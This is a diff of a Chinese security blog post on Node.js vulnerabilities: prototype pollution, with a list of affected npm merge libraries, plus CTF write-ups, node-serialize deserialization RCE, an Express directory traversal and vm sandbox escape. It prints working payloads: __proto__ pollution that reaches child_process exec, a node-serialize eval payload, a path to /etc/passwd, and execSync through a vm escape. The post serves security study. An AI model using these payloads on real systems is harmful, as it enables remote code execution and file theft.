+<p>因为在给object2赋值的时候，<code>__proto__</code>代表object2的原型，也就是说<code>object2 = &#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</code>，是把object2的原型从Object换成了<code>&#123;&quot;b&quot;: 2&#125;</code>对象。o3并没有继承<code>&#123;&quot;b&quot;: 2&#125;</code>，而是继承的Object，所以没有被污染。</p>
+<p>简单来说就是<code>__proto__</code>没有被当成键名，而是被解析了</p>
+<p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”。在赋值时等于<code>o2.__proto__.b=2</code>，所以在遍历object2的时候会存在这个键。<code>console.log(o3.b)</code>输出<code>2</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line"><span class="comment">//1 2</span></span><br><span class="line"><span class="comment">//2</span></span><br></pre></td></tr></table></figure>
+
+<p>在下列库中，均存在原型链污染问题</p>
+<p><strong>1. Merge function</strong></p>
+<ul>
+<li><p>hoek<br> <strong>hoek.merge</strong><br> <strong>hoek.applyToDefaults</strong><br> Fixed in version 4.2.1<br> Fixed in version 5.0.3</p>
+</li>
+<li><p>lodash<br> <strong>lodash.defaultsDeep</strong><br> <strong>lodash.merge</strong><br> <strong>lodash.mergeWith</strong><br> <strong>lodash.set</strong><br> <strong>lodash.setWith</strong><br> Fixed in version 4.17.5</p>
+</li>
+<li><p>merge<br> <strong>merge.recursive</strong><br> Not fixed. Package maintainer didn’t respond to the disclosure.</p>
+</li>
+<li><p>defaults-deep<br> <strong>defaults-deep</strong><br> Fixed in version 0.2.4</p>
+</li>
+<li><p>merge-objects<br> <strong>merge-objects</strong><br> Not fixed. Package maintainer didn’t respond to the disclosure.</p>
+</li>
+<li><p>assign-deep<br> <strong>assign-deep</strong><br> Fixed in version 0.4.7</p>
+</li>
+<li><p>merge-deep<br> <strong>Merge-deep</strong><br> Fixed in version 3.0.1</p>
+</li>
+<li><p>mixin-deep<br> <strong>mixin-deep</strong><br> Fixed in version 1.3.1</p>
+</li>
+<li><p>deep-extend<br> <strong>deep-extend</strong><br> Not fixed. Package maintainer didn’t respond to the disclosure.</p>
+</li>
+<li><p>merge-options<br> <strong>merge-options</strong><br> Not fixed. Package maintainer didn’t respond to the disclosure.</p>
+</li>
+<li><p>deap<br> <strong>deap.extend</strong><br> <strong>deap.merge</strong><br> <strong>deap</strong><br> Fixed in version 1.0.1</p>
+</li>
+<li><p>merge-recursive</p>
+<p><strong>merge-recursive.recursive</strong></p>
+<p>Not fixed. Package maintainer didn’t respond to the disclosure.</p>
+</li>
+</ul>
+<p><strong>2. Clone</strong></p>
+<ul>
+<li>deap<br> <strong>deap.clone</strong><br> Fixed in version 1.0.1</li>
+</ul>
+<p><strong>3. Property definition by path</strong></p>
+<ul>
+<li>lodash<br> <strong>lodash.set</strong><br> <strong>lodash.setWith</strong></li>
+<li>pathval<br> <strong>pathval.setPathValue</strong><br> <strong>pathval</strong></li>
+<li>dot-prop<br> <strong>dot-prop.set</strong><br> <strong>dot-prop</strong></li>
+<li>object-path<br> <strong>object-path.withInheritedProps.ensureExists</strong><br> <strong>object-path.withInheritedProps.set</strong><br> <strong>object-path.withInheritedProps.insert</strong><br> <strong>object-path.withInheritedProps.push</strong><br> <strong>object-path</strong></li>
+</ul>
+<h3 id="CATCTF-2022-wife"><a href="#CATCTF-2022-wife" class="headerlink" title="CATCTF 2022 wife"></a>CATCTF 2022 wife</h3><p>靶场：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/details?hash=e5ba95f8-884a-11ed-ab28-000c29bc20bf&task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=e5ba95f8-884a-11ed-ab28-000c29bc20bf&amp;task_category_id=3</a></p>
+<p>注册部分的代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>json解析后，利用Object.assign()创建子类newUser，push进users</p>
+<p>这里传入payload:<code>&quot;__proto__&quot;&#123;&quot;isAdmin&quot;:true&#125;</code>造成原型链污染，生成的user用户拥有isAdmin&#x3D;true<br><img src="https://i-blog.csdnimg.cn/blog_migrate/df570f457215733b422d11b049586779.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/blog_migrate/df570f457215733b422d11b049586779.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p>
+<h3 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h3><p><a target="_blank" rel="noopener" href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p>
+<p>npm下不了express的，执行<code>npm i gulp-connect@5.6.1</code></p>
+<p>然后编辑配置</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927180031882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927180031882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927180031882"></p>
+<p>重点看下server.js，定义了一个处理根路径请求的路由，调用lodashs.merge对POST body和data进行处理</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927195810158.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927195810158.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927195810158"></p>
+<p>而data的定义在上一排</p>
+<p>data 包含两个属性：language 和 category，它们都是数组类型。</p>
+<p>如果会话中没有 data，则初始化为<code> &#123;language: [], category: []&#125;</code>。否则从session中提取</p>
+<p>而且也满足JSON解析请求体，使用了body-parser处理URL编码和JSON请求体，已经满足了原型链污染的条件了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927201011765.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927201011765.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927201011765"></p>
+<p>原型链污染是有了，还没找到能命令执行的点</p>
+<p>ok，通读一下代码</p>
+<p>先设置session，再定义了一个EJS模板引擎。该模板引擎读取文件，并用lodash库将文件编译为函数。把options参数传递给编译后的函数</p>
+<p>再app.set设置了视图目录为.&#x2F;views，并把刚才定义的ejs指定为视图引擎</p>
+<p>最后是处理根目录请求的方法。刷新data数据后传到index，这里index是模板文件名，实际上包含扩展名是index.ejs。</p>
+<p>因此，data更新后，Express会自动在views目录查找index.ejs文件，并调用lodash.template把该文件转为函数，把<code>&#123; language: data.language, category: data.category &#125; </code>中的数据渲染进模板中的相应位置。</p>
+<p>页面最终通过lodash.template进行渲染，你可以在lodash.js templates函数查看逻辑，也可以在lodash&#x2F;template.js，也可以打上断点跟踪</p>
+<p>看到有个自执行函数：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220053182.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220053182.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927220053182"></p>
+<p>控制sourceURL或者source就能执行任意代码</p>
+<p>向上一看，我操，一堆给source赋值的代码。</p>
+<p>sourceURL就很干净，options默认为undefined，如果我们能污染options.sourceURL</p>
+<p><code>sourceURL = &#39;//# sourceURL= options.sourceURL&#39;</code>，就能执行任意代码</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220958006.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220958006.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927220958006"></p>
+<p>从控制台看到options是Object</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927222038209.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927222038209.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927222038209"></p>
+<p>我们通过之前的根目录路由，污染Object，使其sourceURL属性为</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;sourceURL&quot;</span>:<span class="string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>记得前面加换行，因为<code>//# sourceURL= options.sourceURL</code>前面有注释，尾部也记得加<code>//</code>，注释后面的代码，避免出错。由于Function 环境下没有 require 函数，直接使用require(‘child_process’) 会报错</p>
+<p>注意！Content-Type需要改为<code>application/json</code></p>
+<h2 id="node-serialize-反序列化RCE-CVE-2017-5941"><a href="#node-serialize-反序列化RCE-CVE-2017-5941" class="headerlink" title="node-serialize 反序列化RCE(CVE-2017-5941)"></a>node-serialize 反序列化RCE(CVE-2017-5941)</h2><p>漏洞版本：node-serialize模块&#x3D;&#x3D;0.0.4</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize@0.0.4</span><br></pre></td></tr></table></figure>
+
+<p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中s</p>
+<p>直接看到执行代码的地方：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928211918215.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928211918215.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928211918215"></p>
+<p>读一下这个函数：</p>
+<ul>
+<li>如果输入为字符串，用JSON.parse转换为对象</li>
+<li>遍历对象的属性，递归反序列化嵌套的对象</li>
+<li>如果属性值以<code>_$$ND_FUNC$$_</code>开头，则执行eval</li>
+</ul>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928214539463.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928214539463.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928214539463"></p>
+<p>eval前后用括号包裹，如果obj是外部参数，那我们中间是不是可以套一个自执行函数？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// …</span></span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure>
+
+<p>如下code就能弹计算器</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> node_serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>)</span><br><span class="line">obj = &#123;<span class="string">&quot;any&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&#125;()&quot;</span>&#125;</span><br><span class="line">node_serialize.<span class="title function_">unserialize</span>(obj)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CVE-2017-14849目录穿越"><a href="#CVE-2017-14849目录穿越" class="headerlink" title="CVE-2017-14849目录穿越"></a>CVE-2017-14849目录穿越</h2><ul>
+<li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li>
+<li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li>
+</ul>
+<p>遇到了试一下就完了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/../../../a/../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><p>用vm库可以创建一个沙箱sandbox，阻止沙箱程序影响到进程</p>
+<p>如下代码，创建沙箱执行代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">env = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure>
+
+<p>创建vm环境时，要先初始化一个对象sandbox。这个对象就是vm脚本执行的全局环境context，Script中的this，在执行<code>script.runInContext(context);</code>时就指的sandbox</p>
+<p>sandbox.constructor指sanbox的构造函数，也就是Object</p>
+<p>sandbox.constructor.constructor指Object.constructor，也就是Function，表示Object的构造函数对象本身</p>
+<p>Function(‘return this.process.env’)()就是个自执行函数</p>
+<p>即遇到vm沙箱，也能执行沙箱外的代码。上述代码能用runInNewContext代替</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure>
+
+<p>配合<code>chile_process.exec()</code>就可以执行任意命令</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span></span><br><span class="line"><span class="string">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CVE-2019-10758-mongo-express-RCE"><a href="#CVE-2019-10758-mongo-express-RCE" class="headerlink" title="CVE-2019-10758:mongo-express RCE"></a>CVE-2019-10758:mongo-express RCE</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install mongo-express@<span class="number">0.53</span><span class="number">.0</span> </span><br></pre></td></tr></table></figure>
+
+<p>vm逃逸</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7056">https://xz.aliyun.com/t/7056</a></p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/CTF/" class="">
-              CTF
+            <a href="/tags/nodejs/" class="">
+              nodejs
             </a>
           
         </div>
@@ -677,7 +962,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2024/08/02/cc-ctf-kuai-su-cha-ban/" target="_blank" title="CTF 快速查ban">https://godownio.github.io/2024/08/02/cc-ctf-kuai-su-cha-ban/</a>
+    <a href="/2024/09/30/nodejs-lou-dong/" target="_blank" title="nodejs">https://godownio.github.io/2024/09/30/nodejs-lou-dong/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -695,40 +980,23 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B896.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B896.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">Shiro550 URLDNS&amp;CC&amp;CB攻击</div>
-      </div>
-      
-      <!-- <div class="content">
-        Shiro550环境搭建：123git clone https://github.com/apache/shiro.gi
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B894.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B894.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8101.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8101.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2024/08/02/cc2-cc4-priorityqueue/" class="post-nav-link">
+    <a href="/2024/09/26/rome-lian/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">CC完结PriorityQueue CC2&amp;CC4</div>
+        <div class="title-text">ROME链(ToStringBean&amp;EqualsBean)</div>
       </div>
       <!-- <div class="content">
-        CC2，4都是Common Collections 4.0版本下的反序列化漏洞。pom依赖：
-12345&lt;depe
+        ROME 是一个关于 RSS 和 Atom 格式的 java 框架
+那什么是 RSS 和 Atom 呢？
+RSS 全称：
       </div> -->
     </a>
   </div>
@@ -866,7 +1134,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#other%E9%AA%9A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3"><span class="toc-text">other骚报错解决</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#toUpperCase-%E6%BC%8F%E6%B4%9E"><span class="toc-text">toUpperCase()漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-text">弱类型比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%EF%BC%88%EF%BC%89"><span class="toc-text">eval（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#settimeout"><span class="toc-text">settimeout()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setinterval"><span class="toc-text">setinterval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Function"><span class="toc-text">Function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#child-process%E6%A8%A1%E5%9D%97"><span class="toc-text">child_process模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fs-readFileSync"><span class="toc-text">fs.readFileSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E8%87%AA%E6%89%A7%E8%A1%8C%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="toc-text">js自执行匿名函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#merge%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">merge原型链污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CATCTF-2022-wife"><span class="toc-text">CATCTF 2022 wife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Breaking-2018-Thejs"><span class="toc-text">Code-Breaking 2018 Thejs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#node-serialize-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE-CVE-2017-5941"><span class="toc-text">node-serialize 反序列化RCE(CVE-2017-5941)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-14849%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">CVE-2017-14849目录穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">vm沙箱逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-10758-mongo-express-RCE"><span class="toc-text">CVE-2019-10758:mongo-express RCE</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
